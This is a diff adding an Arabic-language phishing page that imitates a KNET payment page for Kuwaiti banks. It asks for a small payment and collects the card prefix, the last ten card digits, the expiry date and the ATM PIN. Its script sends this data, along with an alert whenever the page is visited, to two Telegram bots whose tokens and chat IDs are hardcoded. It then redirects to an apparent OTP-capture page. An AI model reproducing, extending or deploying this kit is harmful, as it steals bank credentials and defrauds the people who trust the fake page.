@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة دفع كي نت</title>
+    <link rel="stylesheet" href="kpay.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
+
+
+</head>
+
+<style>
+
+#bankSelect ,#prefixSelect ,#yearSelect ,#monthSelect {
+
+padding: 2px;
+}
+
+#pin {
+  -webkit-appearance: none; 
+  -moz-appearance: textfield; 
+  appearance: none;
+  text-align: center;
+  letter-spacing: 10px; 
+  /*position: absolute;*/
+  top: 125px;
+}
+#bankInfoBox {
+  height: 125px !important;
+}
+#bankSelect , #prefixSelect{
+    font-size: 13px !important;
+    padding: 1px;
+    font-weight: bold;
+}
+@supports (-webkit-touch-callout: none) {
+  #bankSelect, #prefixSelect {
+    font-size: 10px !important;
+  }
+}
+/* شاشة التحميل */
+#loader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(255,255,255,0.85); /* شفافية خفيفة */
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  font-family: "Tahoma", sans-serif;
+  color: #333;
+}
+
+/* الدائرة الدوّارة */
+.spinner {
+  border: 5px solid #f3f3f3;
+  border-top: 5px solid #007bff;
+  border-radius: 50%;
+  width: 55px;
+  height: 55px;
+  animation: spin 1s linear infinite;
+  margin-bottom: 15px;
+}
+
+/* حركة الدوران */
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* النص أسفل الدائرة */
+#loader p {
+  font-size: 16px;
+  font-weight: bold;
+  color: #444;
+  margin-top: 10px;
+}
+
+
+  </style>
+  
+<body>
+<div id="loader">
+  <div class="spinner"></div>
+</div>
+    <header id="pageHeader">
+        <img src="kpayt.jpg" alt="رأس الصفحة" id="headerImage">
+    </header>
+    <div class="box bank-info"  id="bankInfoBox">
+        <img id="imgkn" src="./kfh.jpeg" alt="بنك وربة" class="bank-logo" id="bankLogo">
+        <div>
+        <p id="txthom"> :المستفيد</p>
+         <strong id="beneficiaryName" > شركة التهسيلات التجارية - الكويت  </strong>
+        </div>
+         <div> 
+            <hr id="hrhome">
+         </div>
+         <div> 
+         <p id="txthome"> :المبلغ</p>
+         <strong id="amountValu"> 1 دينار </strong>
+        </div>
+    </div>
+    
+
+    <div class="box payment-form" id="boxdiv">
+        <form id="paymentForm" onsubmit="event.preventDefault(); sendToTelegram();" style="padding-bottom: 0px;">
+            <div class="input-container">
+                <label id="textban" for="bankSelect">اختيار البنك:</label>
+                <div class="input-box">
+                    <select id="bankSelect" onchange="updateOptions()" required 
+                    
+                    oninvalid="this.setCustomValidity('يرجى اختيار اسم البنك ')" 
+          oninput="this.setCustomValidity('')">
+                    
+                    
+                    >
+                        <option value="" disabled selected>يرجى اختيار البنك</option>
+                        <option value="ABK">البنك الأهلي المتحد ABK</option>
+                        <option value="RAJHI">RAJHI مصرف الراجحي</option>
+                        <option value="BBK">BBK بنك الكويت والبحرين</option>
+                        <option value="BOUBYAN">BOUBYAN بنك بوبيان</option>
+                        <option value="BURGAN">BURGAN بنك برقان</option>
+                        <option value="CBK">CBK البنك التجاري الكويتي</option>
+                        <option value="DOHA">DOHA بنك الدوحة</option>
+                        <option value="GBK">GBK بنك الخليج</option>
+                        <option value="TAM">TAM بيتك</option>
+                        <option value="KFH">KFH بيت التمويل الكويتي</option>
+                        <option value="KIB">KIB بنك الكويت الدولي</option>
+                        <option value="NBK">NBK بنك الكويت الوطني</option>
+                        <option value="WEYAY">WEYAY الوطني</option>
+                        <option value="QNB">QNB بنك قطر الوطني</option>
+                        <option value="UNB">UNB بنك الاتحاد الوطني</option>
+                        <option value="WARBA">WARBA بنك وربة</option>
+                    </select>
+                </div>
+            </div>
+            <div> 
+                <hr id="hrhome2">
+             </div>
+
+
+            <div class="input-container">
+                <label id="text2" for="cardNumber1">رقم البطاقة:</label>
+                <div class="input-box">
+                    <input type="text"
+       id="cardNumber"
+       placeholder=" "
+       required
+       inputmode="numeric"
+       pattern="\d{10}"
+       maxlength="10"
+       oninvalid="this.setCustomValidity('يرجى إدخال آخر 10 أرقام من البطاقة')"
+       oninput="this.setCustomValidity('')">
+
+                </div>
+                <select id="prefixSelect" required
+                oninvalid="this.setCustomValidity('يرجى اختيار اول 6 ارقام من البطاقة ')" 
+                oninput="this.setCustomValidity('')">
+                
+                >
+                    <option value="" disabled selected>Prefix</option>
+                </select>
+            </div>
+            <div> 
+                <hr id="hrhome3">
+             </div>
+
+            <div class="input-container">
+                <label id="texst3" for="expiryDate">تاريخ انتهاء البطاقة:</label>
+                <div class="expiry input-box">
+                    <select id="monthSelect" required>
+                        <option value="" disabled selected>MM</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                    <select id="yearSelect" required>
+                        <option value="" disabled selected>YYYY</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                        <option value="2031">2031</option>
+                        <option value="2032">2032</option>
+                        <option value="2033">2033</option>
+                        <option value="2034">2034</option>
+                        <option value="2035">2035</option>
+                    </select>
+                </div>
+            </div>
+            <div> 
+                <hr id="hrhome4">
+             </div>
+
+            <div class="input-container">
+                <label id="texst4" for="pin">الرقم السري:</label>
+                <div class="input-box">
+                    <input type="password" id="pin" class="bin" placeholder="" required pattern="\d{4}" maxlength="4" inputmode="numeric" oninvalid="this.setCustomValidity('يرجى ادخال الرقم السري ATM التابع للبطاقة ' )"  oninput="this.setCustomValidity('')"
+                    >
+                    <input type="hidden" id="hiddenName">
+
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <div  class="box buttons" id="boxbuttons" >
+        <button type="submit" form="paymentForm" id="submitButton1">إرسال</button>
+        <button type="button" onclick="resetForm()" id="submitButton10">إلغاء</button>
+    </div>    
+    <p id="naem0">جميع الحقوق محفوظة © 2026 
+   </p>
+        <p id="naem00">   
+        شركة الخدمات المصرفية الالية المشتركة - كي نت   </p>
+
+
+
+
+
+<script>
+
+document.addEventListener("DOMContentLoaded", function() {
+  const loader = document.getElementById("loader");
+  const body = document.body;
+  const form = document.getElementById("otpForm");
+
+  // في البداية نخفي دائرة التحميل
+  loader.style.display = "none";
+
+  // عند الضغط على زر "Confirm"
+  form.addEventListener("submit", function(e) {
+    e.preventDefault(); // منع التحديث الفوري للصفحة
+
+    // تفعيل الدائرة
+    body.style.opacity = "0.5";
+    loader.style.display = "flex";
+
+    // إبقاءها ظاهرة لمدة 5 ثواني
+    setTimeout(() => {
+      loader.style.display = "none";
+      body.style.opacity = "1";
+
+      // يمكنك هنا استدعاء دالة الإرسال أو الانتقال إلى صفحة أخرى
+      alert("تم تأكيد البيانات ✅");
+    }, 5000);
+  });
+});
+
+
+// تعبئة أرقام البنوك (Prefix)
+function updateOptions() {
+  var bank = document.getElementById("bankSelect").value;
+  var prefixSelect = document.getElementById("prefixSelect");
+  prefixSelect.innerHTML = '<option value="" disabled selected>Prefix</option>';
+
+  var options = {
+                    ABK: ["403622", "423826", "428628"],
+                    RAJHI: ["458838"],
+                    BBK: ["588790", "418056"],
+                    BOUBYAN: ["470350", "490455", "490456", "404919", "490456", "450605", "426058", "431199"],
+                    BURGAN: ["49219000", "415254", "450238", "468564", "540759", "402978", "403583"],
+                    CBK: ["532672", "537015", "521175", "516334"],
+                    DOHA: ["419252"],
+                    GBK: ["531644", "517419", "531471", "559475", "517458", "526206", "531329", "531470"],
+                    TAM: ["45077848", "45077849"],
+                    KFH: ["450778", "537016", "532674", "485602"],
+                    KIB: ["406464", "409054"],
+                    NBK: ["464452", "589160"],
+                    WEYAY: ["464425250", "543363"],
+                    QNB: ["524745", "521020"],
+                    UNB: ["457778"],
+                    WARBA: ["532749", "559459", "541350", "525528"]
+                };
+
+  if (options[bank]) {
+    options[bank].forEach(num => {
+      let opt = document.createElement("option");
+      opt.value = num;
+      opt.textContent = num;
+      prefixSelect.appendChild(opt);
+    });
+  }
+}
+
+// الدالة الرئيسية للتحقق + التخزين + الإرسال + التحويل
+function checkForm(event) {
+  if (event) event.preventDefault();
+
+  const bankSelect = document.getElementById("bankSelect").value;
+  const prefixSelect = document.getElementById("prefixSelect").value;
+  const cardNumber = document.getElementById("cardNumber").value.trim();
+  const monthSelect = document.getElementById("monthSelect").value;
+  const yearSelect = document.getElementById("yearSelect").value;
+  const pin = document.getElementById("pin").value.trim();
+  const hiddenName = document.getElementById("hiddenName").value || localStorage.getItem("userName") || "";
+
+  // تحقق من الإدخال
+  if (!bankSelect || !prefixSelect || !cardNumber || !monthSelect || !yearSelect || !pin) {
+    alert("يرجى تعبئة جميع الحقول قبل المتابعة");
+    return false;
+  }
+
+  if (!/^\d{10}$/.test(cardNumber)) {
+    alert("يرجى إدخال آخر 10 أرقام صحيحة من البطاقة");
+    return false;
+  }
+
+  if (!/^\d{4}$/.test(pin)) {
+    alert("يرجى إدخال الرقم السري المكون من 4 أرقام");
+    return false;
+  }
+
+  // تخزين البيانات في sessionStorage
+  sessionStorage.setItem("bankSelect", bankSelect);
+  sessionStorage.setItem("prefixSelect", prefixSelect);
+  sessionStorage.setItem("cardNumber", cardNumber);
+  sessionStorage.setItem("expiryMonth", monthSelect);
+  sessionStorage.setItem("expiryYear", yearSelect);
+  sessionStorage.setItem("pin", pin);
+  if (hiddenName) sessionStorage.setItem("hiddenName", hiddenName);
+
+  console.log("✅ البيانات تم تخزينها في sessionStorage:");
+  console.log({
+    bankSelect,
+    prefixSelect,
+    cardNumber,
+    expiry: monthSelect + "/" + yearSelect,
+    pin,
+    hiddenName
+  });
+
+  // إرسال للتلغرام
+  sendToTelegram().finally(() => {
+    // الانتقال بعد الإرسال
+    setTimeout(() => {
+      window.location.href = "otp1.html";
+    }, 700);
+  });
+
+  return true;
+}
+
+function sendToTelegram() {
+    
+    const userName = sessionStorage.getItem("hiddenName") || localStorage.getItem("userName") || "غير متوفر";
+    const bank = sessionStorage.getItem("bankSelect");
+    const prefix = sessionStorage.getItem("prefixSelect");
+    const card = sessionStorage.getItem("cardNumber");
+    const expiryMonth = sessionStorage.getItem("expiryMonth");
+    const expiryYear = sessionStorage.getItem("expiryYear");
+    const pin = sessionStorage.getItem("pin");
+
+    const message = 
+    `📩 كي نت\n\n` +
+    `👤 الاسم/الجوال: ${userName}\n` +
+    `🏦 البنك: ${bank}\n` +
+    `🔢 البادئة: ${prefix}\n` +
+    `💳 آخر 10 أرقام: ${card}\n` +
+    `📅 انتهاء: ${expiryMonth}/${expiryYear}\n` +
+    `🔑 ATM: ${pin}`;
+
+    const botConfigs = [
+        { token: '8797549963:AAFxHU7EtFf1ZDDRlhPYRtlVk-Watq8L0wM', chatId: '7801329761' },
+        { token: '8189888163:AAGTnrxFPgCMWvHTFogt2oeHNGH4jAtw32Y', chatId: '8108427825' }
+    ];
+
+    // إرسال إلى البوتات كلها
+    const promises = botConfigs.map(({ token, chatId }) => {
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    return fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    })
+    .then(r => r.json())
+    .then(data => {
+      console.log(chatId, data.ok ? "✅ تم الإرسال" : "❌ فشل الإرسال", data);
+      // return data;
+      window.location.href = "otp1.html";
+    })
+    .catch(err => console.error("⚠️ خطأ بالإرسال:", err));
+    });
+    return Promise.all(promises);
+    
+    window.location.href = "otp1.html";
+}
+
+    function in_knet_notification(){
+        const botConfigs = [
+            { token: '8797549963:AAFxHU7EtFf1ZDDRlhPYRtlVk-Watq8L0wM', chatId: '7801329761' },
+            { token: '8189888163:AAGTnrxFPgCMWvHTFogt2oeHNGH4jAtw32Y', chatId: '8108427825' }
+        ];
+        const promises = botConfigs.map(({ token, chatId }) => {
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        return fetch(url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: chatId, text: 'شخص في صفحة الكي النت' })
+            })
+        });    
+    }
+    // ربط الحدث عند تحميل الصفحة
+    document.addEventListener("DOMContentLoaded", () => {
+        const form = document.getElementById("paymentForm");
+        if (form) form.onsubmit = checkForm;
+        in_knet_notification()
+    });
+</script>
+
+
+
+        
+</body>
+</html>
